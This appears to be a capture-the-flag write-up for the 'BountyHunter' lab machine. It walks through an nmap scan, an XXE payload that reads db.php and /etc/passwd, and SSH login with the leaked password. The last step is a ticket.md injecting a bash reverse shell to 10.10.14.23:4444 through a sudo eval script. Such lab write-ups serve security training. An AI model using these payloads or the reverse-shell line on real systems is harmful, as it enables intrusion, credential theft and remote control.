# nmap scan

```shell
Nmap scan report for bounty.htb (10.129.95.166)
Host is up (0.075s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Bounty Hunters
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

> found XXE vulnerability on http://bounty.htb/log_submit.php the payload was base64 encoded

# XXE payload

> used this payload which translates to [code below]

```base64 
PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gInBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9L3Zhci93d3cvaHRtbC9kYi5waHAiPiBdPgkJPGJ1Z3JlcG9ydD4KCQk8dGl0bGU%2bJmV4YW1wbGU7PC90aXRsZT4KCQk8Y3dlPnRxd2U8L2N3ZT4KCQk8Y3Zzcz5xd2U8L2N2c3M%2bCgkJPHJld2FyZD5ycTwvcmV3YXJkPgoJCTwvYnVncmVwb3J0Pg%3d%3d
```

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php"> ]>		
<bugreport>
		<title>&example;</title>
		<cwe>tqwe</cwe>
		<cvss>qwe</cvss>
		<reward>rq</reward>
</bugreport>

```

it returns a php file with admin credentials
```php
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

```shell
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
==development==:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin

```

> in addition to the php files, /etc/passwd can also be displayed using the payload.
> I used the credentials on the **development** user to gain shell access 

```shell
ssh development@bounty.htb
```

> gained access to the shell, the user has a sudo privilege to run a python script on which executes user input using the *eval* method
> 
```shell
User development may run the following commands on bountyhunter: (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

> the python script extracts text from a markdown file, markdown file strictly follows a format, nonetheless it exit the execution

> I used this ticket file on the python script 

## ticket.md
```python 
# Skytrain Inc
## Ticket to testa
__Ticket Code:__
**11 __import__('os').system('bash -c "bash -i >& /dev/tcp/10.10.14.23/4444 0>&1"')

```


> then I execute the script 

```shell
sudo python3.8 /opt/skytrain_inc/ticketValidator.py
```

